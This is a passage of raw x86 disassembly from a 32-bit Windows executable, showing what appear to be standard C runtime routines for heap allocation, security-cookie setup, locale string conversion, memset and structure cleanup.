  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
  426156:	call   0x426b76
  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
